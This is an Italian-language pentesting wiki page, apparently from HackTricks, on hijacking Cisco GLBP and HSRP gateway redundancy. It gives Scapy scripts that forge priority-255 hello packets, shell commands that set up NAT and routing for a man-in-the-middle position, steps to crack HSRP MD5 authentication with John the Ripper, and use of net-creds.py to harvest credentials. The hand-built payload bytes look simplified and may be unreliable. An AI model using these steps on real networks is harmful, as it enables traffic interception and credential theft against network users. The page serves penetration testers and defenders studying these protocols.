# GLBP & HSRP Attacchi

{{#include ../../banners/hacktricks-training.md}}


## Panoramica sul dirottamento FHRP

### Approfondimenti su FHRP

FHRP è progettato per fornire robustezza alla rete fondendo più router in un'unica unità virtuale, migliorando così la distribuzione del carico e la tolleranza ai guasti. Cisco Systems ha introdotto protocolli importanti in questa suite, come GLBP e HSRP.

### Approfondimenti sul protocollo GLBP

GLBP, creato da Cisco, opera sullo stack TCP/IP utilizzando UDP sulla porta 3222 per la comunicazione. I router in un gruppo GLBP scambiano pacchetti "hello" a intervalli di 3 secondi. Se un router non invia questi pacchetti per 10 secondi, viene considerato offline. Tuttavia, questi timer non sono fissi e possono essere modificati.

GLBP per IPv6 usa il multicast **FF02::66** su UDP/3222, e il formato della MAC virtuale diventa `0007.b4xx.xxyy` (l'AVF ID è nell'ultimo byte). Temporizzazione e superficie di attacco restano le stesse dell'IPv4, quindi le tecniche di dirottamento funzionano anche in reti dual‑stack.

### Operazioni GLBP e distribuzione del carico

GLBP si distingue per permettere la distribuzione del carico tra i router usando un singolo IP virtuale abbinato a più indirizzi MAC virtuali. In un gruppo GLBP, ogni router partecipa all'inoltro dei pacchetti. A differenza di HSRP/VRRP, GLBP offre un vero bilanciamento del carico tramite diversi meccanismi:

- **Host-Dependent Load Balancing:** Mantiene l'assegnazione coerente dell'indirizzo MAC AVF a un host, essenziale per configurazioni NAT stabili.
- **Round-Robin Load Balancing:** L'approccio predefinito, alterna l'assegnazione degli indirizzi MAC AVF tra gli host richiedenti.
- **Weighted Round-Robin Load Balancing:** Distribuisce il carico in base a metriche "Weight" predefinite.

### Componenti chiave e terminologia in GLBP

- **AVG (Active Virtual Gateway):** Il router principale, responsabile dell'assegnazione degli indirizzi MAC ai router peer.
- **AVF (Active Virtual Forwarder):** Un router designato a gestire il traffico di rete.
- **GLBP Priority:** Una metrica che determina l'AVG, con valore predefinito 100 e intervallo da 1 a 255.
- **GLBP Weight:** Rappresenta il carico corrente su un router, regolabile manualmente o tramite Object Tracking.
- **GLBP Virtual IP Address:** Funziona come gateway predefinito della rete per tutti i dispositivi connessi.

Per le interazioni, GLBP impiega l'indirizzo multicast riservato 224.0.0.102 e la porta UDP 3222. I router trasmettono pacchetti "hello" a intervalli di 3 secondi e vengono considerati non operativi se manca un pacchetto per 10 secondi.

### Meccanismo di attacco GLBP

Un attaccante può diventare il router primario inviando un pacchetto GLBP con il valore di priority massimo (255). Questo può portare a attacchi DoS o MITM, permettendo l'intercettazione o il reindirizzamento del traffico.

**Dirottamento GLBP pratico con Scapy (breve PoC)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
Costruisci i byte del payload per emulare l'header GLBP (version/opcode/priority/weight/VRID). Ripetere il frame in loop garantisce la vittoria nell'elezione AVG se l'autenticazione è assente.

### Esecuzione di un attacco GLBP con Loki

[Loki](https://github.com/raizo62/loki_on_kali) può eseguire un attacco GLBP iniettando un pacchetto con priority e weight impostati a 255. Le fasi preliminari includono la raccolta di informazioni come l'indirizzo IP virtuale, la presenza di autenticazione e i valori di priority dei router usando strumenti come Wireshark.

Attack Steps:

1. Passare in promiscuous mode e abilitare IP forwarding.
2. Identificare il router target e recuperare il suo IP.
3. Generare un Gratuitous ARP.
4. Iniettare un pacchetto GLBP malevolo, impersonando l'AVG.
5. Assegnare un indirizzo IP secondario all'interfaccia di rete dell'attaccante, rispecchiando il GLBP virtual IP.
6. Implementare SNAT per ottenere visibilità completa sul traffico.
7. Regolare il routing per garantire l'accesso a Internet continuato tramite il router AVG originale.

Seguendo questi passaggi, l'attaccante si posiziona come un "man in the middle", capace di intercettare e analizzare il traffico di rete, inclusi dati non cifrati o sensibili.

Per dimostrazione, ecco gli snippet di comandi richiesti:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Il monitoraggio e l'intercettazione del traffico possono essere effettuati usando net-creds.py o strumenti simili per catturare e analizzare i dati che attraversano la rete compromessa.

### Spiegazione passiva del dirottamento HSRP con dettagli sui comandi

#### Panoramica di HSRP (Hot Standby Router/Redundancy Protocol)

HSRP è un protocollo proprietario Cisco progettato per la ridondanza del gateway di rete. Permette di configurare più router fisici in una singola unità logica con un indirizzo IP condiviso. Questa unità logica è gestita da un router primario responsabile dell'instradamento del traffico. A differenza di GLBP, che utilizza metriche come priority e weight per il load balancing, HSRP si basa su un singolo router active per la gestione del traffico.

HSRPv1 uses multicast **224.0.0.2** and virtual MAC `0000.0c07.acXX`; HSRPv2 and HSRPv2 for IPv6 use **224.0.0.102 / FF02::66** and virtual MAC `0000.0c9f.fXXX`. UDP destination port is **1985** for IPv4 and **2029** for IPv6.

#### Ruoli e terminologia in HSRP

- **HSRP Active Router**: Il dispositivo che funge da gateway, gestendo il flusso di traffico.
- **HSRP Standby Router**: Un router di backup, pronto a subentrare se il router Active smette di funzionare.
- **HSRP Group**: Un insieme di router che collaborano per formare un singolo router virtuale resiliente.
- **HSRP MAC Address**: Un indirizzo MAC virtuale assegnato al router logico nella configurazione HSRP.
- **HSRP Virtual IP Address**: L'indirizzo IP virtuale del gruppo HSRP, che funge da gateway predefinito per i dispositivi connessi.

#### Versioni di HSRP

HSRP è disponibile in due versioni, HSRPv1 e HSRPv2, che differiscono principalmente per la capacità dei gruppi, l'uso degli IP multicast e la struttura dell'indirizzo MAC virtuale. Il protocollo utilizza specifici indirizzi IP multicast per lo scambio di informazioni di servizio, con pacchetti Hello inviati ogni 3 secondi. Un router è considerato inattivo se non viene ricevuto alcun pacchetto entro un intervallo di 10 secondi.

#### Meccanismo di attacco HSRP

Gli attacchi HSRP consistono nel prendere forzatamente il controllo del ruolo del router Active iniettando un valore di priorità massimo. Questo può portare a un attacco Man-In-The-Middle (MITM). I passaggi essenziali prima dell'attacco includono la raccolta di informazioni sulla configurazione HSRP, che può essere effettuata usando Wireshark per l'analisi del traffico.

**Rapida presa di controllo HSRP con Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
Se l'autenticazione **non** è configurata, l'invio continuo di hellos con priorità più alta forza i peer negli stati *Speak*/*Listen* e ti permette di diventare *Active*, reindirizzando il traffico attraverso il tuo host.

**Casi limite dell'autenticazione HSRP**

- L'autenticazione legacy in plain-text è trivialmente spoofable.
- L'autenticazione MD5 copre solo il payload HSRP; pacchetti appositamente creati possono comunque effettuare rate-limit/DoS sui control plane. Release NX-OS in passato hanno permesso DoS contro gruppi autenticati (vedi Cisco advisory CSCup11309).
- Su molte VLAN condivise di ISP / VPS, i multicast HSRPv1 sono visibili ai tenant; senza auth puoi unirti e preemptare il traffico.

#### Passaggi per bypassare l'autenticazione HSRP

1. Salva il traffico di rete contenente dati HSRP in un file .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Estrai gli hash MD5 dal file .pcap usando hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Cracca gli hash MD5 usando John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Esecuzione di HSRP Injection con Loki**

1. Avvia Loki per identificare gli HSRP advertisements.
2. Imposta l'interfaccia di rete in modalità promiscua e abilita l'IP forwarding.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Usa Loki per mirare il router specifico, inserire la password HSRP craccata e effettuare le configurazioni necessarie per impersonare l'Active Router.
4. Dopo aver ottenuto il ruolo di Active Router, configura la tua interfaccia di rete e gli IP tables per intercettare il traffico legittimo.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Modifica la tabella di routing per instradare il traffico attraverso il precedente Active Router.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Usa net-creds.py o un'utilità simile per catturare credenziali dal traffico intercettato.
```shell
sudo python2 net-creds.py -i eth0
```

L'esecuzione di questi passaggi mette l'attaccante in condizione di intercettare e manipolare il traffico, in modo simile alla procedura per GLBP hijacking. Questo evidenzia la vulnerabilità dei protocolli di ridondanza come HSRP e la necessità di misure di sicurezza robuste.

## Riferimenti

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
